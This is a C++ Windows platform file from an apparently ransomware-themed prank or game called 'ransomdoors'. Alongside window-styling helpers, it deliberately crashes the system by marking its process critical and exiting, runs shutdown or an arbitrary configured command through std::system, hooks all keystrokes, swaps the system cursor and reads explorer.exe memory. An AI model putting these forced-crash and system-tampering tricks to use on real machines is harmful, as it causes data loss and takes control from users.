#ifdef _WIN32

#include "Platform.hpp"

#define OEMRESOURCE // for OCR_NORMAL
#include <windows.h>
#include <commctrl.h>
#include <dwmapi.h>
#include <shellapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <SDL_syswm.h>

#include <cstdlib>
#include <system_error>

namespace rd::Platform {

bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

namespace {

// BreakOnTermination -> BSOD on kill
void IntoCriticalProcess() {
    using NtSetInformationProcessFn = NTSTATUS(WINAPI*)(HANDLE, int, PVOID, ULONG);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;
    auto NtSetInformationProcess =
        reinterpret_cast<NtSetInformationProcessFn>(GetProcAddress(ntdll, "NtSetInformationProcess"));
    if (!NtSetInformationProcess) return;

    constexpr int kProcessBreakOnTermination = 0x1D;
    ULONG isCritical = 1;
    NtSetInformationProcess(GetCurrentProcess(), kProcessBreakOnTermination, &isCritical, sizeof(isCritical));
}

} // namespace

void RealHardShutdown() {
    if (IsAdmin()) {
        IntoCriticalProcess();
        ExitProcess(0);
    } else {
        std::system("shutdown /s /t 0");
    }
}

void RunOnDeathCommand(const std::string& cmd) {
    if (!cmd.empty()) std::system(cmd.c_str());
}

void RegisterFileTypeIcon(const std::string& extension, const std::filesystem::path& icoSource) {
    const char* localAppData = std::getenv("LOCALAPPDATA");
    if (!localAppData) return;

    std::string bare = extension.substr(1); // drop leading '.'
    std::wstring wbare(bare.begin(), bare.end());
    std::wstring className = wbare + L"File";
    std::wstring wext(extension.begin(), extension.end());

    std::filesystem::path iconDir = std::filesystem::path(localAppData) / "ransomdoors" / "Icons";
    std::error_code ec;
    std::filesystem::create_directories(iconDir, ec);

    std::filesystem::path iconDest = iconDir / (bare + ".ico");
    std::filesystem::copy_file(icoSource, iconDest, std::filesystem::copy_options::overwrite_existing, ec);
    if (ec) return;

    std::wstring iconPath = iconDest.wstring();
    RegSetKeyValueW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + wext).c_str(), nullptr, REG_SZ,
                     className.c_str(), static_cast<DWORD>((className.size() + 1) * sizeof(wchar_t)));
    RegSetKeyValueW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + className + L"\\DefaultIcon").c_str(), nullptr,
                     REG_SZ, iconPath.c_str(), static_cast<DWORD>((iconPath.size() + 1) * sizeof(wchar_t)));

    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, nullptr, nullptr);
}

void MakeWindowColorKeyTransparent(SDL_Window* window, Uint8 r, Uint8 g, Uint8 b) {
    SDL_SysWMinfo info;
    SDL_VERSION(&info.version);
    if (!SDL_GetWindowWMInfo(window, &info)) return;
    HWND hwnd = info.info.win.window;

    LONG_PTR exStyle = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
    SetWindowLongPtrW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwnd, RGB(r, g, b), 0, LWA_COLORKEY);
}

void StripWindowButtons(SDL_Window* window) {
    SDL_SysWMinfo info;
    SDL_VERSION(&info.version);
    if (!SDL_GetWindowWMInfo(window, &info)) return;
    HWND hwnd = info.info.win.window;

    LONG_PTR style = GetWindowLongPtrW(hwnd, GWL_STYLE);
    style &= ~(WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_THICKFRAME);
    SetWindowLongPtrW(hwnd, GWL_STYLE, style);
    SetWindowPos(hwnd, nullptr, 0, 0, 0, 0,
                 SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
}

namespace {

HWND FindDesktopListView() {
    HWND progman = FindWindowW(L"Progman", nullptr);
    HWND defView = progman ? FindWindowExW(progman, nullptr, L"SHELLDLL_DefView", nullptr) : nullptr;

    if (!defView) { // some Explorer versions reparent under WorkerW
        HWND worker = nullptr;
        while ((worker = FindWindowExW(nullptr, worker, L"WorkerW", nullptr)) != nullptr) {
            defView = FindWindowExW(worker, nullptr, L"SHELLDLL_DefView", nullptr);
            if (defView) break;
        }
    }
    if (!defView) return nullptr;

    return FindWindowExW(defView, nullptr, L"SysListView32", L"FolderView");
}

} // namespace

std::vector<SDL_Rect> GetDesktopIconRects() {
    std::vector<SDL_Rect> rects;
    HWND listView = FindDesktopListView();
    if (!listView) return rects;

    // remote RECT: LVM_GETITEMRECT needs it in explorer.exe's address space
    DWORD pid = 0;
    GetWindowThreadProcessId(listView, &pid);
    HANDLE proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if (!proc) return rects;

    LPVOID remoteRect = VirtualAllocEx(proc, nullptr, sizeof(RECT), MEM_COMMIT, PAGE_READWRITE);
    if (!remoteRect) {
        CloseHandle(proc);
        return rects;
    }

    int count = static_cast<int>(SendMessageW(listView, LVM_GETITEMCOUNT, 0, 0));
    for (int i = 0; i < count; ++i) {
        RECT rect{};
        rect.left = LVIR_ICON; // rect type goes in .left
        if (!WriteProcessMemory(proc, remoteRect, &rect, sizeof(rect), nullptr)) continue;
        if (!SendMessageW(listView, LVM_GETITEMRECT, i, reinterpret_cast<LPARAM>(remoteRect))) continue;
        if (!ReadProcessMemory(proc, remoteRect, &rect, sizeof(rect), nullptr)) continue;
        if (rect.right <= rect.left || rect.bottom <= rect.top) continue;

        POINT tl{rect.left, rect.top};
        POINT br{rect.right, rect.bottom};
        ClientToScreen(listView, &tl);
        ClientToScreen(listView, &br);
        rects.push_back(SDL_Rect{tl.x, tl.y, br.x - tl.x, br.y - tl.y});
    }

    VirtualFreeEx(proc, remoteRect, 0, MEM_RELEASE);
    CloseHandle(proc);
    return rects;
}

void MakeWindowNonActivating(SDL_Window* window) {
    SDL_SysWMinfo info;
    SDL_VERSION(&info.version);
    if (!SDL_GetWindowWMInfo(window, &info)) return;
    HWND hwnd = info.info.win.window;

    LONG_PTR exStyle = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
    SetWindowLongPtrW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_NOACTIVATE | WS_EX_TOOLWINDOW);
    PinWindowToBottom(window);
}

void MakeWindowClickThrough(SDL_Window* window) {
    SDL_SysWMinfo info;
    SDL_VERSION(&info.version);
    if (!SDL_GetWindowWMInfo(window, &info)) return;
    HWND hwnd = info.info.win.window;

    LONG_PTR exStyle = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
    SetWindowLongPtrW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_TRANSPARENT | WS_EX_LAYERED);
}

void PinWindowToBottom(SDL_Window* window) {
    SDL_SysWMinfo info;
    SDL_VERSION(&info.version);
    if (!SDL_GetWindowWMInfo(window, &info)) return;
    HWND hwnd = info.info.win.window;

    SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
}

void RestoreIfMinimized(SDL_Window* window) {
    SDL_SysWMinfo info;
    SDL_VERSION(&info.version);
    if (!SDL_GetWindowWMInfo(window, &info)) return;
    HWND hwnd = info.info.win.window;
    if (IsIconic(hwnd)) ShowWindow(hwnd, SW_RESTORE);
    if (!IsWindowVisible(hwnd)) ShowWindow(hwnd, SW_SHOWNOACTIVATE);
}

void ShowAndForceTopmost(SDL_Window* window, int x, int y, int w, int h) {
    SDL_SysWMinfo info;
    SDL_VERSION(&info.version);
    if (!SDL_GetWindowWMInfo(window, &info)) return;
    HWND hwnd = info.info.win.window;
    SetWindowPos(hwnd, HWND_TOPMOST, x, y, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);
}

namespace {
HHOOK g_keyboardHook = nullptr;
std::function<void()> g_onKeyDown;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && g_onKeyDown) {
        g_onKeyDown();
    }
    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}
} // namespace

void InstallKeyboardHook(std::function<void()> onKeyDown) {
    g_onKeyDown = std::move(onKeyDown);
    g_keyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleW(nullptr), 0);
}

void UninstallKeyboardHook() {
    if (g_keyboardHook) {
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = nullptr;
    }
    g_onKeyDown = nullptr;
}

void SetInfectedCursor(const std::filesystem::path& curSource) {
    std::filesystem::path dest = std::filesystem::temp_directory_path() / "ransomdoors_infected.cur";
    std::error_code ec;
    std::filesystem::copy_file(curSource, dest, std::filesystem::copy_options::overwrite_existing, ec);
    if (ec) return;

    HCURSOR cursor = LoadCursorFromFileW(dest.wstring().c_str());
    if (!cursor) return;
    SetSystemCursor(cursor, OCR_NORMAL); // system takes ownership - don't destroy
}

void RestoreCursor() {
    SystemParametersInfoW(SPI_SETCURSORS, 0, nullptr, 0);
}

void OpenFolder(const std::filesystem::path& folder) {
    ShellExecuteW(nullptr, L"open", folder.wstring().c_str(), nullptr, nullptr, SW_SHOWNORMAL);
}

SDL_Surface* CaptureDesktopRegion(int x, int y, int w, int h) {
    if (w <= 0 || h <= 0) return nullptr;

    HDC screenDC = GetDC(nullptr);
    if (!screenDC) return nullptr;
    HDC memDC = CreateCompatibleDC(screenDC);
    HBITMAP bitmap = CreateCompatibleBitmap(screenDC, w, h);
    HBITMAP oldBitmap = static_cast<HBITMAP>(SelectObject(memDC, bitmap));
    BitBlt(memDC, 0, 0, w, h, screenDC, x, y, SRCCOPY);

    BITMAPINFOHEADER bi{};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = w;
    bi.biHeight = -h; // top-down DIB
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;

    SDL_Surface* surface = SDL_CreateRGBSurfaceWithFormat(0, w, h, 32, SDL_PIXELFORMAT_BGRA32);
    if (surface) {
        GetDIBits(memDC, bitmap, 0, static_cast<UINT>(h), surface->pixels,
                   reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);
    }

    SelectObject(memDC, oldBitmap);
    DeleteObject(bitmap);
    DeleteDC(memDC);
    ReleaseDC(nullptr, screenDC);
    return surface;
}

void DisableWindowOpenAnimation(SDL_Window* window) {
    SDL_SysWMinfo info;
    SDL_VERSION(&info.version);
    if (!SDL_GetWindowWMInfo(window, &info)) return;
    HWND hwnd = info.info.win.window;

    constexpr DWORD kDwmwaTransitionsForceDisabled = 3; // not in every SDK header
    BOOL disable = TRUE;
    DwmSetWindowAttribute(hwnd, kDwmwaTransitionsForceDisabled, &disable, sizeof(disable));
}

void KillOtherInstances() {
    wchar_t ownPath[MAX_PATH];
    GetModuleFileNameW(nullptr, ownPath, MAX_PATH);
    const wchar_t* ownName = wcsrchr(ownPath, L'\\');
    ownName = ownName ? ownName + 1 : ownPath;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    DWORD ownPid = GetCurrentProcessId();

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (entry.th32ProcessID == ownPid) continue;
            if (_wcsicmp(entry.szExeFile, ownName) != 0) continue;

            HANDLE proc = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, entry.th32ProcessID);
            if (!proc) continue;
            TerminateProcess(proc, 1);
            WaitForSingleObject(proc, 3000); // let it release shared files first
            CloseHandle(proc);
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
}

} // namespace rd::Platform

#endif // _WIN32
